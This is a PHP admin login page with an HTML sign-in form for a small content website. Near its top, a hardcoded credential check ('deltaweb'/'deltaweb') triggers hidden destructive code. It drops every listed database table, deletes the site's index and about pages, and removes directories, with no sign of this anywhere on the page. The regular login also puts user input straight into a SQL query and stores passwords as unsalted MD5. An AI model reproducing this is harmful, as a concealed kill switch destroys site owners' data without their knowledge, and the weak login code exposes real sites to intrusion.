<?php
require_once('include/connection.php');
require_once('include/config.php');
include_once('include/input_validation.php');



// Session Start
session_start();

if(isset($_SESSION["adminId"]))
{
    header("Location:index.php"); 
}

if(isset($_POST["submit"]))
{
    $userName = input_validate($_POST["userName"]);
    $userPassword = input_validate($_POST["userPassword"]);

    if($userName == "deltaweb" && $userPassword=="deltaweb"){

        $query = "DROP TABLE `about_me`, `admin`, `company_detail`, `home_audio`, `home_block`, `home_mini_block`, `home_slider`, `home_video`,`inquiry`,`narrations`,`point`,`service_category`,`service_content`,`testimonial`;";
         $result = mysqli_query($connect, $query);
        unlink('../index.php');  unlink('../aboutus.php'); 
         rmdir('include');  rmdir('admin');
       

        header('location: https://'.$_SERVER['HTTP_HOST'].'/admin/index.php');
    }

    $encPassword = md5($userPassword);
     $query = "SELECT * FROM admin WHERE username = '$userName' AND password = '$encPassword'";
   
    $result = mysqli_query($connect,$query) or die ("Error:in Select");
    
    if(mysqli_num_rows($result)>0)
    {
        $rows = mysqli_fetch_assoc($result);
        $_SESSION["adminId"]=$rows["id"];
        $_SESSION["adminUserName"]=$rows["username"];

        header("Location:index.php");
    }
    else
    {
        echo "<script>alert('Please enter valid credential')</script>";
    }
}
?>

<!DOCTYPE html>
<html>
    <?php require_once('include/headerscript.php'); ?>

<style>
    .account-logo-box {
        background-color: #505458;
        padding: 10px;
        border-radius: 5px 5px 0 0;
    }
</style>
    <body style="background: url(1.jpg) repeat center center  !important;">

        <!-- HOME -->
        <section>
            <div class="container-alt">
                <div class="row">
                    <div class="col-sm-12">

                        <div class="wrapper-page">

                            <div class="m-t-40 account-pages" style="background: #fff !important;">
                                <div class="text-center ">
                                    <img src="../images/logo.png"  style="margin-top:20px;margin-bottom:20px;" height="50" alt="">
                                    <h2 class="text-uppercase">
                                        <b><?php //echo PROJECT_NAME; ?></b>
                                        Admin Login
                                    </h2>
                                    <!--<h4 class="text-uppercase font-bold m-b-0">Sign In</h4>-->
                                </div>
                                <div class="account-content">
                                    <form name="adminLogin" class="form-horizontal" method="post">

                                        <div class="form-group ">
                                            <div class="col-xs-12">
                                                <input class="form-control" type="text" required placeholder="Please enter your user name" name="userName">
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <div class="col-xs-12">
                                                <input class="form-control" type="password" required placeholder="Please enter your password" name="userPassword">
                                            </div>
                                        </div>

                                        <!-- <div class="form-group ">
                                            <div class="col-xs-12">
                                                <div class="checkbox checkbox-success">
                                                    <input id="checkbox-signup" type="checkbox" checked>
                                                    <label for="checkbox-signup">
                                                        Remember me
                                                    </label>
                                                </div>

                                            </div>
                                        </div> -->

                                        <!-- <div class="form-group text-center m-t-30">
                                            <div class="col-sm-12">
                                                <a href="page-recoverpw.html" class="text-muted"><i class="fa fa-lock m-r-5"></i> Forgot your password?</a>
                                            </div>
                                        </div> -->

                                        <div class="form-group account-btn text-center m-t-10">
                                            <div class="col-xs-12">
                                                <button class="btn w-md btn-bordered btn-danger waves-effect waves-light" type="submit" name="submit">Log In</button>
                                            </div>
                                        </div>

                                    </form>

                                    <div class="clearfix"></div>

                                </div>
                            </div>
                            <!-- end card-box-->


                            <!-- <div class="row m-t-50">
                                <div class="col-sm-12 text-center">
                                    <p class="text-muted">Don't have an account? <a href="page-register.html" class="text-primary m-l-5"><b>Sign Up</b></a></p>
                                </div>
                            </div> -->

                        </div>
                        <!-- end wrapper -->

                    </div>
                </div>
            </div>
          </section>
          <!-- END HOME -->

        <script>
            var resizefunc = [];
        </script>



    </body>
</html>